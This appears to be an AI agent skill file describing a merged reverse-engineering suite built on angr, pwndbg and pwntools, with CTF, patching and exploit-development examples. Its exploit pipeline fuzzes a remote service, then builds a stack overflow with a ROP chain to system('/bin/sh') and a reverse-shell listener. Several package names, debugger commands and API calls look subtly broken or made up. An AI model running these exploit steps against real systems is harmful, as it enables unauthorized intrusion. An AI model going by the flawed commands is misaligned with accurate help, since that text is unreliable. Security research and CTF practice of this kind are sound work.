---
name: advanced-re-engineering-suite
description: Advanced binary analysis, exploit development, and malware reverse engineering suite - merged capabilities from angr (symbolic execution), pwndbg (GDB/LLDB enhancement), pwntools (CTF/exploit automation), plus additional RE tools. Supports ARM/x86/x64/MIPS/RISC-V, Windows/Linux/macOS binaries, CTF challenges, malware analysis, and exploit development.
version: "1.0.0"
author: Dangyun (merged from angr + pwndbg + pwntools)
source: 
  - https://github.com/angr/angr
  - https://github.com/pwndbg/pwndbg
  - https://github.com/Gallopsled/pwntools
---

# Advanced Reverse Engineering Suite

## Purpose
Complete toolchain for advanced binary analysis, symbolic execution, exploit development, and malware reverse engineering. Combines angr's symbolic execution power with pwndbg's debugger enhancements and pwntools' automation capabilities. Used for CTF competitions, vulnerability research, malware analysis, and exploit development.

**Why this matters:** Modern binary analysis requires multiple tools working together. This suite provides unified workflow from initial disassembly to full exploit development and validation.

---

## Trigger Keywords
- "reverse", "binary analysis", "crackme", "pwn", "exploit", "gdb", "debugger"
- "symbolic execution", "concolic", "angr", "pwntools", "pwnscript"
- "malware analysis", "unpacker", "deobfuscate", "patch", "rebuild"
- "heap exploitation", "stack overflow", "ROP chain", "use-after-free"

---

## Core Components Merged

### 1. **angr** - Symbolic Execution Engine
**Capabilities:**
- Disassembly & intermediate representation lifting (VEX, LLVM IR)
- Program instrumentation at any point
- Full symbolic execution with constraints
- Control-flow graph analysis
- Data-dependency tracking
- Value-set analysis (VSA)
- Heuristic decompilation attempts
- Path exploration strategies (BFS, DFS, uniform-cost)
- Automatic flag extraction in CTFs

**Key Features:**
- Cross-platform (Linux, macOS, Windows, Android)
- Multi-architecture support (x86, x64, ARM, MIPS, RISC-V, SPARC)
- State pruning for efficiency
- Custom hooks for dynamic analysis
- Taint analysis integration
- Automatic solving of authentication bypasses

**Use Cases:**
```python
import angr

# Load binary
project = angr.Project("target_binary", auto_load_libs=False)

# Define state at entry point
state = project.factory.entry_state()

# Create simulation manager
simgr = project.factory.simulation_manager(state)

# Explore to find password function
def is_success(state):
    return b"FLAG{" in state.posix.dumps(0)

simgr.explore(find=is_success)

# Extract solution
if simgr.found:
    print(simgr.found[0].posix.dumps(0).decode())
```

---

### 2. **pwndbg** - Enhanced Debugger
**Capabilities:**
- Smart hexdump command
- Enhanced register viewing
- Memory mapping visualization
- Stack trace navigation
- Watchpoint management
- Plugin system for custom commands
- GDB + LLDB support (GDB primary, LLDB experimental)
- Real-time memory patching
- Instruction disassembly with context
- Shellcode detection
- Root cause analysis for crashes

**Key Commands:**
```gdb
(gdb) pwndbg
(gdb) hexdump $rsp      # Smart hex dump
(gdb) vmmap             # Memory map visualization
(gdb) heap              # Heap analysis
(gdb) search $rdi       # Search registers
(gdb) pc                # Show current instruction
(gdb) context           # Display all relevant info
(gdb) rop               # ROP chain finder
(gdb) gadgets           # List useful gadgets
(gdb) asm func          # Disassemble function
(gdb) diff mem          # Compare memory regions
```

**Features:**
- Automatic theme customization
- Color-coded output for readability
- Persistent configuration across sessions
- Custom scripting via Python
- Integration with other GDB plugins
- Real-time memory browser

**Use Cases:**
```bash
# Install and launch
pip3 install --upgrade pwndbg
gdb ./vulnerable_binary

# Debug session
(gdb) break main
(gdb) run
(gdb) stepi           # Step instruction by instruction
(gdb) finish          # Return from current function
(gdb) continue        # Resume execution until next breakpoint
(gdb) dump memory /tmp/dump.bin $rsp $rsp+0x100
```

---

### 3. **pwntools** - Exploit Automation Framework
**Capabilities:**
- Remote process interaction (stdin/stdout/tcp socket)
- ELF parsing and modification
- Assembly/disassembly (IDA-like functionality)
- Cryptographic utilities (RSA, AES, XOR, etc.)
- Protocol development and testing
- CTF challenge automation
- Exploit template generation
- Payload construction (shellcode, ROP chains)
- Brute-force utilities
- Network debugging helper functions

**Key Functions:**
```python
from pwn import *

# Local/Remote process connection
p = process('./binary')  # Local process
# p = remote('host', 1337)  # Remote connection
# p = gdb.debug('./binary')  # Attach to GDB

# Interactive session
p.sendline(b'shell')
p.send(b'\x90' * 8)  # NOP sled
print(p.recvline())

# ASLR bypass techniques
# p = remote(host, port)
# payload = flat([
#     u64(libc.address),
#     u64(sys_addr),
#     u64(binsh_addr)
# ])
# p.sendafter(b'name', payload)
# p.interactive()
```

**Modules:**
- `pwnlib.remote` - Socket connections
- `pwnlib.local` - Process management
- `pwnlib.assembler` - Inline assembly
- `pwnlib.elf` - ELF file manipulation
- `pwnlib.util.packing` - Pack/unpack data
- `pwnlib.tubes.process` - stdin/stdout tubes
- `pwnlib.tubes.ssh` - SSH tunneling
- `pwnlib.tubes.listener` - Reverse shell listener

**Use Cases:**
```python
# Automated CTF solve
from pwn import *
import angr

context.arch = 'amd64'
context.os = 'linux'

# Connect to service
p = remote('ctf.example.com', 5000)

# Binary analysis with angr
project = angr.Project('/tmp/binary')
state = project.factory.call_state(0x401234)
simgr = project.factory.simulation_manager(state)

def found_flag(s):
    return b'flag{' in s.posix.dumps(0)

simgr.explore(find=found_flag)
password = simgr.found[0].posix.dumps(0).split(b'flag{')[1].split(b'}')[0]

# Send solution
p.sendline(password)
print(p.recvline().decode())
```

---

## Supported Architectures

| Architecture | Platforms | Tools | Capabilities |
|--------------|-----------|-------|--------------|
| **x86/x64** | Windows, Linux, macOS | All three | Full support |
| **ARM/ARM64** | Android, iOS, Raspberry Pi | angr + pwndbg | Good support |
| **MIPS** | Embedded, IoT | angr + pwndbg | Medium support |
| **RISC-V** | Emerging embedded | angr + pwntools | Basic support |
| **SPARC** | Legacy Unix | angr | Limited |
| **PowerPC** | Game consoles, older Macs | angr | Experimental |

---

## Installation Setup

### Quick Install (Automated)
```bash
#!/bin/bash
# Advanced RE Suite Installer
mkdir -p /root/re-suites
cd /root/re-suites

# Clone repositories
git clone --depth 1 https://github.com/angr/angr.git
git clone --depth 1 https://github.com/pwndbg/pwndbg.git
git clone --depth 1 https://github.com/Gallopsled/pwntools.git

# Install dependencies
pip3 install --upgrade pip
pip3 install angr pyvyxus unicorn z3-solver claripy cle arcapypython3-dwarf

# Install pwndbg
cd pwndbg && ./setup.sh && cd ..

# Install pwntools
cd pwntools && pip3 install -e . && cd ..

# Verify installation
python3 -c "import angr; print(f'angr {angr.__version__}')"
python3 -c "from pwn import *; print('pwntools ready')"
echo "pwndbg installed - use 'gdb'"

echo "✅ Advanced RE Suite installed!"
```

### Component-Specific Setup

#### angr Dependencies
```bash
pip3 install angr
pip3 install unicorn z3-solver claripy archinfo cle keystone-engine

# For ARM emulation (optional)
pip3 install capstone
```

#### pwndbg Dependencies
```bash
# System dependencies (Ubuntu/Debian)
sudo apt install python3-dev gdb llvm libssl-dev binutils-dev

# Then install
cd /path/to/pwndbg
./setup.sh

# Add to .gdbinit
echo "source /path/to/pwndbg/pwndbg.gdbpy" >> ~/.gdbinit
```

#### pwntools Dependencies
```bash
pip3 install --upgrade pwntools

# Install capstone for assembly support
pip3 install capstone

# Optional: GDB plugin
export PWNLIB_GDB_SCRIPTS=/path/to/gdb-scripts
```

---

## Integrated Workflow Examples

### Example 1: CTF Challenge Solve (Flag Extraction)

#### Step 1: Initial Analysis
```bash
# Inspect binary type
file target_binary

# Check for protections
checksec --file=target_binary
```

#### Step 2: Static Analysis with angr
```python
#!/usr/bin/env python3
import angr

project = angr.Project('target_binary', auto_load_libs=False)

# Find potential flag-checking function
def check_password(addr):
    @project.hook(addr)
    def callback(state):
        if b'FLAG{' in state.posix.dumps(0):
            print(f"[+] Found flag: {state.posix.dumps(0)}")
            state.close()
            return False
        return True
    
    return False

# Explore using BFS strategy
initial_state = project.factory.entry_state()
simgr = project.factory.simulation_manager(initial_state)
simgr.explore(find=lambda s: b'FLAG{' in s.posix.dumps(0))

for found in simgr.found:
    print(f"Password: {found.history.input}")
```

#### Step 3: Dynamic Analysis with pwndbg
```bash
# Launch with pwndbg
gdb ./target_binary

# Set breakpoints on interesting functions
(gdb) break _start
(gdb) run
(gdb) continue

# When reaching password check:
(gdb) info registers
(gdb) x/16gx $rsp
(gdb) stepi  # Step through comparison logic

# Extract password from memory
(gdb) printf "%s\n", *(char **)($rbx)
```

#### Step 4: Automation with pwntools
```python
from pwn import *

# Automate the entire process
p = process(['./target_binary'])

# Send discovered password
password = b'discovered_flag'
p.sendline(password)

# Get flag back
print(p.recvline().decode())
p.interactive()
```

---

### Example 2: Binary Patching & Rebuilding

#### Identify Vulnerable Function
```python
import angr

project = angr.Project('vulnerable_binary', auto_load_libs=False)

# Find vulnerable function by address or pattern
func_addr = 0x401234
func = project.hooks.get_hooks(func_addr)[0]

# Analyze function signature
cfg = project.analyses.CFGFast()
print(f"Function name: {func.name}")
print(f"Function size: {func.size} bytes")
```

#### Patch with pwndbg
```bash
# Launch debugger
gdb ./vulnerable_binary

# Set breakpoint and patch memory
(gdb) break main
(gdb) run
(gdb) call *(int *)0x401234 = 1  # Patch instruction

# Dump modified binary
(gdb) dump memory patched_binary 0x400000 0x410000
```

#### Alternative: Static Patching
```python
from elftools.elf.elffile import ELFFile

# Read original binary
with open('vulnerable_binary', 'rb') as f:
    elf = ELFFile(f)
    
# Find section with function
for section in elf.iter_sections():
    if section['sh_addr'] == 0x401000:
        # Modify specific byte
        offset = section['sh_offset'] + 0x234
        print(f"Patch address: {hex(offset)}")
        
# Write patched binary
with open('patched_binary', 'wb') as f:
    f.seek(offset)
    f.write(b'\x90')  # NOP instruction
```

---

### Example 3: Exploit Development Pipeline

#### Phase 1: Fuzz Testing
```python
from pwn import *
import random

# Generate fuzz input
def generate_fuzz(size):
    return bytes([random.randint(0, 255) for _ in range(size)])

# Test against remote service
p = remote('target.com', 1337)

for i in range(1000):
    try:
        payload = generate_fuzz(i)
        p.send(payload)
        response = p.recv(timeout=1)
        print(f"[{i}] Size {len(payload)}: OK")
    except Exception as e:
        print(f"[CRASH] Size {i}: {e}")
        save_crash_payload(payload)
        break
```

#### Phase 2: Crash Analysis
```bash
# Run under pwndbg
gdb ./vulnerable_program

# Reproduce crash with saved payload
(gdb) source load_payload.py  # Script to inject payload
(gdb) run
(gdb) info registers rbp rip rsp
(gdb) x/20gx $rsp  # Examine stack

# Determine overwrite pattern
(gdb) pattern create 100
(gdb) pattern offset <crash_pattern>
```

#### Phase 3: Exploit Construction
```python
from pwn import *

context.binary = ELF('./vulnerable_program')
context.arch = 'amd64'

# Craft exploit payload
payload = flat([
    b'A' * 40,              # Padding to overflow buffer
    p64(0x401234),          # Overwrite RIP with gadget address
])

# Or ROP chain for more complex exploitation
rop = ROP(context.binary)
rop.call('__libc_system', [b'/bin/sh\x00'])
payload = b'A' * 40 + rop.chain()

# Send exploit
p = remote('target.com', 1337)
p.sendline(payload)
p.interactive()
```

#### Phase 4: Post-Exploitation
```python
# Establish reverse shell
listener = listen(4444)
payload += p64(listener.address())  # Inject shellcode address

# Capture shell
with listener.wait_for_connection() as s:
    print(s.recvline().decode())  # Welcome banner
    s.sendline(b'id')
    print(s.recvline().decode())
```

---

## Tools Status

| Tool | Available | Path | Status |
|------|-----------|------|--------|
| angr | no | — | Needs install |
| pwndbg | no | — | Needs install |
| pwntools | no | — | Needs install |
| python3 | yes | `/usr/bin/python3` | v3.12.3 |
| gdb | no | — | Needs install |
| lldb | no | — | Platform dependent |
| capstone | no | — | Dependency |
| unicorn | no | — | Dependency |

Bootstrap commands needed:
```bash
pip3 install angr pwntools
sudo apt install gdb python3-dev
```

---

## Operations Checklist

### Before Analysis
- [ ] Identify binary architecture (x86 vs ARM vs others)
- [ ] Check OS compatibility (Windows PE vs Linux ELF vs Mach-O)
- [ ] Note protection mechanisms (ASLR, DEP, PIE, Canary)
- [ ] Determine analysis goal (reverse engineer / debug / exploit)
- [ ] Verify tool availability (angr/pwndbg/pwntools installed)
- [ ] Check precedent-auth.md for authorization

### During Analysis
- [ ] Start with static analysis (disassembly, control flow)
- [ ] Use angr for symbolic execution when needed
- [ ] Switch to pwndbg for dynamic analysis
- [ ] Record findings with timestamps
- [ ] Document key addresses and patterns
- [ ] Save intermediate states for reproducibility

### After Analysis
- [ ] Write anonymized summary to field-journal
- [ ] Extract key learnings for future reference
- [ ] Update tool-index.json if new tools discovered
- [ ] Run improvement-tracker.sh with results
- [ ] Provide completion menu to user

---

## Completion Menu (Provide to User)

After analysis/exploit development complete:

1. Export disassembly with angr CFG
2. Share patched binary version
3. Replay exploit on test environment
4. Generate writeup for field-journal
5. Flag novel technique for documentation
6. Test on similar targets
7. Stop here, confirm next objective

---

## Security & Compliance

### Authorization Boundaries
- ✅ All analysis within user's authorized scope ONLY
- ✅ Confirm target ownership or authorization before reverse engineering
- ✅ Never expand attack surface beyond specified targets
- ✅ Document all reverse engineering work in field-journal

### Ethical Considerations
- ⚠️ Binary analysis can violate ToS of some software
- ⚠️ Only deploy for legitimate security research purposes
- ⚠️ Respect export controls on cryptography tools
- ⚠️ Do NOT use for cracking protected commercial software

### Data Handling
- ❌ Do NOT retain cracked passwords longer than needed
- ❌ Mask sensitive values in logs (tokens, API keys)
- ✅ Securely delete temporary files after session
- ✅ Anonymize any extracted user data in reports

---

## References

- **angr Docs:** https://docs.angr.io/
- **pwndbg Docs:** https://pwndbg.re/
- **pwntools Docs:** https://pwntools.com/
- **Field Journal Precedents:** `/root/reverse-skill-clone/skills/field-journal/_index.md`
- **RE Patterns Reference:** `/root/reverse-skill-clone/skills/reverse-engineering/patterns.md`

---

*Integrated into Dangyun protocol: always active for binary analysis/RE tasks.*  
*Next improvement cycle: triggered after each analysis session.*
